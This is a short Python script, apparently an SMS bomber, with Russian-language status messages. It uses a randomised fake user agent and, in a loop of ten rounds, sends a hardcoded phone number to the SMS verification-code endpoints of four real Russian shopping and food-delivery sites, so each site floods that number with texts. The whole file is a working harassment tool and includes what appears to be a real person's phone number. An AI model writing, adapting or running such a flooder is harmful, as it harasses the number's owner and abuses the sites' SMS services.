import requests, fake_useragent
from termcolor import cprint


list_config = {'https://shop.vsk.ru/ajax/auth/postSmsX/': 'phone',
               'https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode': 'telephone_t'}

user = fake_useragent.UserAgent().random
header = {'user_agent': user}

print(f'Симулятор браузера: {user}')

# NUMBER = input('Введите номер пользователя..\n+')
NUMBER = '79034379447'

def sendMsg(url, type, number):
    try:
        res = requests.post(url=url, headers=header, data={type: number})
        # print(number)
        cprint(f'Отправка прошла успешно на {url}!', 'green')
    except:
        cprint(f'Неуспешная отправка на {url}!', 'red')

# try:
#     res = requests.post(url='https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', headers=header, data={'phone': NUMBER})
#     print('Отправка прошла успешно!')
# except:
#     print('Что-то пошло не так!')

for _ in range(10):
    sendMsg(url='https://shop.vsk.ru/ajax/auth/postSmsX/', type='phone', number=NUMBER)
    sendMsg(url='https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', type='telephone_t', number=str(8) + NUMBER[1:])
    sendMsg(url='https://zdravcity.ru/ajax/auth_v2/getAuthType.php', type='phone', number='+' + NUMBER)
    sendMsg(url='https://dodopizza.ru/api/sendconfirmationcode', type='phoneNumber', number='+' + NUMBER)

